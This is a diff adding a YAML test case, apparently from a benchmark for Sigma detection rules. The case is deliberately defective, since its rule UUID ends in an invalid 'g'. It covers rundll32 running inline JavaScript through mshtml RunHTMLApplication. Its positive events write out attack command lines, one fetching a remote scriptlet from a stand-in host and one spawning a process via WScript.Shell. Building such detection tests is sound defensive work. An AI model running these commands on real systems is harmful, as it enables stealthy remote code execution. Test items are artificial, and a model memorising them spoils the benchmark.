@@ -1,0 +1,110 @@
+id: D2-01
+role: defective
+defect_class: D2
+evasive: true
+why: The id field is present and has the 8-4-4-4-12 shape of a UUID, but its final character is 'g', which
+  is not a hexadecimal digit, so it is not a valid UUID. Every other field and the detection logic are
+  valid.
+expected_gate: G2
+report_text: 'Harbor Lantern intrusion, workstation LAB-WS-14. The operator avoided dropping a binary
+  and instead abused a signed Windows utility to run script content directly. Responders recovered a command
+  line that began with rundll32.exe javascript: and called the mshtml,RunHTMLApplication export, launched
+  as a child of WINWORD.EXE. The RunHTMLApplication export of mshtml.dll evaluates the inline script,
+  which then retrieved a second stage from stage.harborlantern.test. The same pattern appeared on three
+  other workstations over one weekend. Analysts found no legitimate software in the environment that pairs
+  rundll32.exe with the javascript: scheme, and because the script never touches disk the process command
+  line is the most reliable observable.'
+evidence:
+- 'Responders recovered a command line that began with rundll32.exe javascript: and called the mshtml,RunHTMLApplication
+  export'
+logsource: windows_process_creation
+techniques:
+- T1218.011
+sigma_yaml: |
+  title: Rundll32 Evaluating Inline JavaScript via RunHTMLApplication
+  id: 5c0e7a1d-93b4-4f28-a6d1-9d41c2e7b05g
+  status: experimental
+  description: Detects rundll32 evaluating inline script through the mshtml RunHTMLApplication export as seen in the Harbor Lantern intrusion.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.stealth
+    - attack.t1218.011
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\rundll32.exe'
+      CommandLine|contains|all:
+        - 'javascript:'
+        - 'RunHTMLApplication'
+    condition: selection
+  falsepositives:
+    - Legitimate software that embeds script through rundll32 was not observed in the laboratory
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\rundll32.exe
+    cmd: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://stage.harborlantern.test/a.sct")
+    parent: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+    parent_cmd: WINWORD.EXE /n invoice.docx
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\SysWOW64\rundll32.exe
+    cmd: RUNDLL32.EXE JAVASCRIPT:"\..\mshtml,RunHTMLApplication ";h=new ActiveXObject('WScript.Shell');h.Run('calc.exe')
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe /c start
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\notepad.exe
+    cmd: notepad.exe C:\Users\alice\notes.txt
+    parent: C:\Windows\explorer.exe
+    parent_cmd: C:\Windows\explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\ipconfig.exe
+    cmd: ipconfig /all
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\carol
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\rundll32.exe
+    cmd: rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,0
+    parent: C:\Windows\explorer.exe
+    parent_cmd: C:\Windows\explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\rundll32.exe
+    cmd: rundll32.exe printui.dll,PrintUIEntry /in /n\\printsrv.lab.example\HPLaser
+    parent: C:\Windows\System32\spoolsv.exe
+    parent_cmd: C:\Windows\System32\spoolsv.exe
+    user: LAB\carol
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
